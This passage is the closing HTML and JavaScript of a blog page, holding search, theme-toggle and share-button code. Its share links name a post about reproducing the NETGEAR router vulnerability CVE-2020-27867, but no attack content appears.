            $resultContent.innerHTML = "<ul><span class='local-search-empty'>请求失败，尝试重新刷新页面或稍后重试。<span></ul>";
          }
        }
      });
      $(document).on('click', '#search-close-icon', function() {
        $('#search-input').val('');
        $('#search-result').html('');
      });
    }

    var getSearchFile = function() {
        var path = "/search.xml";
        searchFunc(path, 'search-input', 'search-result');
    }
  </script>




        
  <div class="tools-bar-item theme-icon" id="switch-color-scheme">
    <a href="javascript: void(0)">
      <i id="theme-icon" class="iconfont icon-moon"></i>
    </a>
  </div>

  
<script src="/js/colorscheme.js"></script>





        
  
    <div class="share-icon tools-bar-item">
      <a href="javascript: void(0)" id="share-icon">
        <i class="iconfont iconshare"></i>
      </a>
      <div class="share-content hidden">
        
          <a class="share-item" href="https://twitter.com/intent/tweet?text=' + %E3%80%90CVE.0x04%E3%80%91CVE-2020-27867%20NETGEAR%20%E8%B7%AF%E7%94%B1%E5%99%A8%20RCE%20%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%8F%8A%E7%AE%80%E8%A6%81%E5%88%86%E6%9E%90 + '&url=' + http%3A%2F%2Fblog.arttnba3.cn%2F2021%2F08%2F17%2FCVE-0X04-CVE-2020-27867%2F + '" target="_blank" title="Twitter">
            <i class="iconfont icon-twitter"></i>
          </a>
        
        
          <a class="share-item" href="https://www.facebook.com/sharer.php?u=http://blog.arttnba3.cn/2021/08/17/CVE-0X04-CVE-2020-27867/" target="_blank" title="Facebook">
            <i class="iconfont icon-facebooksquare"></i>
          </a>
        
      </div>
    </div>
  
  
<script src="/js/shares.js"></script>



      </div>
    </div>
  </body>
</html>
